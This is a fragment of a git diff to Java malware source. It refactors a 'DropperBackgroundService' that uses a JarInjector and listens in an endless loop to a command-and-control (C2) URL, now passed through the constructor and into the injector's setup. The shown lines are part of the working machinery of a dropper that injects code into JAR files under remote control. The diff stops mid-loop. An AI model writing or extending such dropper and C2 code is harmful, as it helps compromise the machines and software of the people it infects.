@@ -15,12 +15,15 @@ import static dropper.utils.HttpUtil.sendPOST;
 public class DropperBackgroundService {
     private final static Gson gson = new Gson();
     private JarInjector injector;
+    private String c2Url;
 
-    public DropperBackgroundService() {
+    public DropperBackgroundService(String c2Url) {
+        this.c2Url = c2Url;
         injector = new JarInjector();
+        injector.setupEnv(c2Url);
     }
 
-    public void listen(String c2Url, Agent agent) {
+    public void listen(Agent agent) {
         String response;
         while (true) {
             try {
